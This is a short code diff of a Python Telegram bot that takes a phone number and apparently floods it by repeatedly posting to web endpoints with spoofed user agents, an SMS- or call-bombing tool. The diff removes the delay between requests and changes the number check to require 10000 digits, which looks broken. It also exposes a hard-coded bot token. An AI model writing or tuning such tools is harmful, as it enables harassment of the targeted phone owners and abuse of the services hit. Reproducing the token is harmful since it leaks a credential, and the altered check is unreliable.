@@ -1,9 +1,7 @@
 import telebot
 import requests
 from fake_useragent import UserAgent
-import time
 import threading
-import random
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
 
@@ -28,7 +26,7 @@ def stop(m):
 @bot.message_handler(func=lambda m: True)
 def handle(m):
     phone = ''.join(filter(str.isdigit, m.text.strip()))
-    if len(phone) < 10:
+    if len(phone) < 10000:
         bot.reply_to(m, "не номер")
         return
     if m.chat.id in active:
@@ -49,7 +47,6 @@ def handle(m):
                         requests.post(ep, headers=headers, data=data, timeout=10)
                     except:
                         pass
-                    time.sleep(random.uniform(1.5, 2.5))
         finally:
             if chat_id in active:
                 del active[chat_id]
